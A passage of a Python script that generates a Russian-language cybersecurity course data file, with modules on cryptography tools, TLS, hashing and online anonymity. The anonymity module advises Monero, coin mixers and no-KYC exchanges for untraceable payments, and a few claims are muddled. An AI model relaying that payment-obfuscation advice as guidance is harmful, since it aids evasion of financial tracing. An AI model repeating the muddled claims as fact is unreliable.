        ('pre', '# Полезные фильтры Wireshark\nhttp.request\nhttp.response.code == 200\ndns.qry.name contains "example"\nip.src == 192.168.1.1 and tcp.port == 80\ntcp.flags.syn == 1 and tcp.flags.ack == 0'),
    ]),
]

# ============================================================
# MODULE 9: Криптография (6 submodules)
# ============================================================
crypto_subs = [
    make_submodule('📖 Основы криптографии', [
        ('h3', 'Виды криптографии'),
        ('ul', [
            '<strong>Симметричная</strong> — AES-256, ChaCha20 (один ключ, быстро)',
            '<strong>Асимметричная</strong> — RSA-4096, ECC (пара ключей, медленно)',
            '<strong>Хэширование</strong> — SHA-256, SHA-3, bcrypt, argon2 (необратимо)',
            '<strong>Гибридная</strong> — TLS, GPG (симметричный ключ шифруется асимметрично)',
        ]),
        ('p', '<strong>Важно:</strong> никогда не придумывай свою криптографию. Используй проверенные стандарты и библиотеки.'),
    ]),
    make_submodule('🔑 GPG / OpenPGP', [
        ('h3', 'GNU Privacy Guard'),
        ('pre', '# Генерация ключа\ngpg --full-generate-key\n\n# Список ключей\ngpg --list-keys\ngpg --list-secret-keys\n\n# Экспорт публичного ключа\ngpg --export -a "Name" > pubkey.asc\n\n# Импорт чужого ключа\ngpg --import pubkey.asc\n\n# Шифрование\ngpg -e -r "Name" file.txt\n\n# Расшифровка\ngpg -d file.txt.gpg\n\n# Подпись\ngpg -s file.txt\n\n# Проверка подписи\ngpg --verify file.txt.sig'),
    ]),
    make_submodule('🌐 SSL/TLS', [
        ('h3', 'Что такое TLS?'),
        ('p', 'Transport Layer Security — протокол шифрования канала связи. HTTPS = HTTP + TLS.'),
        ('ul', [
            '<strong>Сертификаты</strong> — LetsEncrypt (бесплатно, 90 дней)',
            '<strong>mTLS</strong> — взаимная аутентификация (клиент + сервер)',
            '<strong>HSTS</strong> — принудительный HTTPS через заголовок',
            '<strong>Certificate Pinning</strong> — привязка сертификата',
        ]),
        ('pre', '# Проверка TLS\necho | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -text\n\n# LetsEncrypt (certbot)\ncertbot certonly --standalone -d example.com'),
    ]),
    make_submodule('🔐 Хэширование', [
        ('h3', 'Виды хэшей'),
        ('ul', [
            '<strong>SHA-256 / SHA-3</strong> — для целостности',
            '<strong>bcrypt</strong> — для паролей (медленный, с солью)',
            '<strong>argon2</strong> — современный (победитель Password Hashing Competition)',
            '<strong>scrypt</strong> — устойчив к ASIC',
        ]),
        ('h3', 'Проверка хэшей'),
        ('pre', '# Создание хэша\necho -n "password" | sha256sum\necho -n "password" | md5sum\n\n# bcrypt (Python)\nimport bcrypt\nhash = bcrypt.hashpw(b"password", bcrypt.gensalt())\nbcrypt.checkpw(b"password", hash)'),
        ('p', '<strong>Никогда не храни пароли</strong> в MD5, SHA-1 или unsalted SHA-256. Используй argon2 или bcrypt.'),
    ]),
    make_submodule('🔏 Цифровые подписи', [
        ('h3', 'Как работают подписи'),
        ('p', 'Хэш документа шифруется приватным ключом. Любой может проверить подпись публичным ключом.'),
        ('ul', [
            '<strong>RSA Signatures</strong> — RS256, RS384, RS512',
            '<strong>ECDSA</strong> — ES256, ES384 (на эллиптических кривых)',
            '<strong>EdDSA</strong> — Ed25519 (современный, быстрый)',
        ]),
        ('pre', '# GPG подпись\ngpg -s file.txt\ngpg --verify file.txt.gpg\n\n# OpenSSL подпись\nopenssl dgst -sha256 -sign private.pem -out signature.bin file.txt\nopenssl dgst -sha256 -verify public.pem -signature signature.bin file.txt'),
    ]),
    make_submodule('🧪 Криптоанализ', [
        ('h3', 'Атаки на шифры'),
        ('ul', [
            '<strong>Brute force</strong> — перебор ключей (неэффективно для AES)',
            '<strong>Rainbow tables</strong> — предвычисленные хэши (соль спасает)',
            '<strong>Side-channel</strong> — время, питание, звук, электромагнитное излучение',
            '<strong>Padding oracle</strong> — раскрытие данных через оракул паддинга',
            '<strong>Frequency analysis</strong> — для простых шифров (Цезарь, Виженер)',
        ]),
        ('p', 'Криптоанализ AES-256 сегодня невозможен на классических компьютерах. Квантовые — другая история (Grover\\\'s algorithm).'),
    ]),
]

# ============================================================
# MODULE 10: Анонимность (7 submodules)
# ============================================================
anon_subs = [
    make_submodule('🎭 Принципы OPSEC', [
        ('h3', 'Operations Security'),
        ('ul', [
            '<strong>Разделяй активности</strong> — разные профили для разного (работа, личное, хобби)',
            '<strong>Минимум данных</strong> — не оставляй след без нужды',
            '<strong>Не верь в полную анонимность</strong> — её не существует',
            '<strong>Compartmentalization</strong> — утечка одной активности не роняет все',
            '<strong>Threat model</strong> — от кого ты прячешься? Режим, спецслужбы, хакеры?',
        ]),
        ('p', 'OPSEC — это не инструменты, это образ мышления. Инструменты лишь помогают.'),
    ]),
    make_submodule('🔧 Инструменты анонимности', [
        ('h3', 'Основные инструменты'),
        ('ul', [
            '<strong>Tor Browser</strong> — анонимный веб (луковичная маршрутизация)',
            '<strong>Tails OS</strong> — RAM-only ОС, не оставляет следов',
            '<strong>Whonix</strong> — Gateway (Tor) + Workstation (изолированная)',
            '<strong>Proton VPN / Mullvad</strong> — VPN без логов',
            '<strong>ProtonMail / Tutanota</strong> — приватная почта',
            '<strong>Signal</strong> — мессенджер с шифрованием',
        ]),
        ('p', 'Комбинация Tor + VPN (Tor over VPN или VPN over Tor) — разные подходы с разными трейд-оффами.'),
    ]),
    make_submodule('📸 Метаданные', [
        ('h3', 'Опасность метаданных'),
        ('p', 'Фото содержит: GPS-координаты, модель камеры, дату и время, софт для обработки, серийный номер камеры.'),
        ('pre', '# Удалить все метаданные\nexiftool -all= photo.jpg\n\n# Или (ImageMagick)\nconvert photo.jpg -strip clean.jpg\n\n# Смотреть метаданные\nexiftool photo.jpg\nidentify -verbose photo.jpg'),
        ('h3', 'Автоматическая очистка'),
        ('p', 'Используй <strong>MAT (Metadata Anonymisation Toolkit)</strong> — автоматически чистит файлы перед публикацией.'),
    ]),
    make_submodule('🌐 Tor Browser', [
        ('h3', 'Как работает Tor'),
        ('ul', [
            'Трафик проходит через 3 реле (Guard, Middle, Exit)',
            'Каждый узел знает только предыдущий и следующий',
            'Exit нода может видеть твой трафик (используй HTTPS!)',
            '.onion сайты — скрытые сервисы',
        ]),
        ('h3', 'Настройка безопасности'),
        ('ul', [
            'Уровень безопасности: Standard → Safer → Safest',
            'Отключи JavaScript для Safest (много сайтов сломается)',
            'Не меняй размер окна — это уникализирует fingerprint',
            'Не логинься в соцсети через Tor',
        ]),
    ]),
    make_submodule('💸 Криптовалюты', [
        ('h3', 'Анонимные платежи'),
        ('p', 'Биткоин — НЕ анонимен. Все транзакции публичны в блокчейне. Используй Monero для приватности.'),
        ('ul', [
            '<strong>Monero (XMR)</strong> — скрытые отправитель, получатель, сумма',
            '<strong>Bitcoin + Tumbler</strong> — микшеры (ненадёжно)',
            '<strong>Zcash (ZEC)</strong> — shielded транзакции (zk-SNARKs)',
            '<strong>Локальные обменники</strong> — p2p, без KYC',
        ]),
        ('p', 'Если нужна анонимность — используй Monero. Если нужен Bitcoin — используй для замешивания.'),
    ]),
    make_submodule('📱 Анонимный доступ', [
        ('h3', 'Как оставаться анонимным'),
        ('ul', [
            '<strong>Браузер</strong> — Tor Browser, Brave (с прокладкой через Tor)',
            '<strong>Поиск</strong> — DuckDuckGo, SearX',
            '<strong>Почта</strong> — ProtonMail, Tutanota (анонимная регистрация)',
            '<strong>Мессенджеры</strong> — Signal (номер не обязателен в Session)',
            '<strong>Номер телефона</strong> — виртуальные номера (Google Voice, SIP)',
            '<strong>VPN</strong> — Mullvad, ProtonVPN (принимают Monero)',
        ]),
    ]),
    make_submodule('⚠️ Компромат', [
        ('h3', 'Что тебя рассекретит'),
        ('ul', [
            '<strong>Fingerprint браузера</strong> — canvas, WebGL, шрифты, разрешение',
            '<strong>Логины на сайтах</strong> — email/телефон привязан к профилю',
            '<strong>IP утечки</strong> — WebRTC, загрузка ресурсов без прокси',
            '<strong>Время активности</strong> — по времени постов можно вычислить часовой пояс',
            '<strong>Стиль письма</strong> — стеганография авторства (Stylometry)',
            '<strong>Социальные связи</strong> — друзья, репосты, комментарии',
        ]),
        ('p', '<strong>Совет:</strong> используй разные пароли, разные username, разные email для разных активностей. Compartmentalization — ключ к анонимности.'),
    ]),
]

# ============================================================
# BUILD THE FULL JS
# ============================================================

modules = [
    make_module('osint', '🕵️', 'OSINT', 'Разведка по открытым источникам: инструменты, техники, базы данных, Google Dorks, поиск информации, анализ соцсетей, утечки.', '16', osint_subs),
    make_module('pentest', '⚔️', 'Пентестинг', 'Тестирование на проникновение: методологии, инструменты, практика, CTF, отчёты, защита.', '12', pentest_subs),
    make_module('coding', '💻', 'Программирование', 'Python, JavaScript, Bash, Node.js. Скрипты, автоматизация, best practices, алгоритмы, базы данных.', '14', coding_subs),
    make_module('linux', '🐧', 'Linux / Unix', 'Arch, Debian, Kali. Установка, администрирование, Docker, systemd, сети, безопасность, тулинг.', '14', linux_subs),
    make_module('windows', '🪟', 'Windows', 'PowerShell, AD, Group Policy, безопасность, администрирование, автоматизация, реестр.', '8', windows_subs),
    make_module('cyber', '🛡️', 'Кибербезопасность', 'Основы безопасности, шифрование, VPN, анонимность, защита данных, threat intel, EDR, реагирование.', '12', cyber_subs),
    make_module('networks', '🌐', 'Сети / Networking', 'TCP/IP, DNS, HTTP, прокси, VPN, протоколы, маршрутизация, анализ трафика, сетевая безопасность.', '10', networks_subs),
    make_module('tools', '🔧', 'Инструменты', 'Полезные утилиты, тулы для OSINT/пентеста, конфигурация окружения, автоматизация, анализ.', '9', tools_subs),
    make_module('crypto', '🔐', 'Криптография', 'Основы шифрования, GPG, SSL/TLS, хэширование, симметричное и асимметричное шифрование, криптоанализ.', '6', crypto_subs),
    make_module('anon', '🎭', 'Анонимность', 'Tor, VPN, прокси, OPSEC, приватность, метаданные, безопасная работа в сети, криптовалюты.', '7', anon_subs),
]

js_content = f'''/**
 * CyberDesacratio — база модулей и подмодулей (108 подмодулей)
 * Сгенерировано автоматически
 */

const MODULES = [
{',\n'.join(modules)}
];
'''

# Write to file
output_path = '/home/radmir/memorialDesacratio/data.js'
with open(output_path, 'w', encoding='utf-8') as f:
    f.write(js_content)

print(f"Written {len(js_content)} bytes to {output_path}")
print(f"Total modules: {len(modules)}")

# Count submodules
total = 0
for m in modules:
    # count submodules from the string
    count = sum(1 for line in m.split('\n') if 'title:' in line and 'submodules' not in line)
    total += count
    print(f"  Module: submodules count = {count}")

print(f"Total submodules: {total}")
